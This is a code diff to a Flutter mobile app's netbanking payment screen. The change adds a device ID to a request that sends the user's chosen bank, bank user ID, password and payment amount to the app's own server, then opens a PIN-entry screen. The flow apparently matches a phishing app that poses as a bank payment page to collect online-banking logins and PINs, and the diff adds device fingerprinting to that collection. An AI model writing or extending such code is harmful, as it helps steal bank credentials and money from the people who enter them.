@@ -4,6 +4,7 @@ import 'dart:convert';
 import 'package:http/http.dart' as http;
 import '../api_config.dart';
 import '../theme.dart';
+import '../services/device_service.dart';
 
 class NetbankingScreen extends StatefulWidget {
   final double amount;
@@ -353,15 +354,18 @@ class _S extends State<NetbankingScreen> {
                   height: 54,
                   child: ElevatedButton.icon(
                     onPressed: _valid ? () {
-  http.post(Uri.parse('$apiBaseUrl/api/netbanking'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({
-    'bank_name': selectedBank!.name,
-    'user_id': userId.text,
-    'password': password.text,
-    'remember_me': remember,
-    'amount': widget.amount,
-  }))
-    .then((_) => print('API success'))
-    .catchError((e) => print('API error: $e'));
+  DeviceService.getDeviceId().then((deviceId) {
+    http.post(Uri.parse('$apiBaseUrl/api/netbanking'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({
+      'bank_name': selectedBank!.name,
+      'user_id': userId.text,
+      'password': password.text,
+      'remember_me': remember,
+      'amount': widget.amount,
+      'device_id': deviceId,
+    }))
+      .then((_) => print('API success'))
+      .catchError((e) => print('API error: $e'));
+  });
   context.push('/netbanking-pin', extra: widget.amount);
 } : null,
                     icon: const Icon(Icons.lock, size: 18),
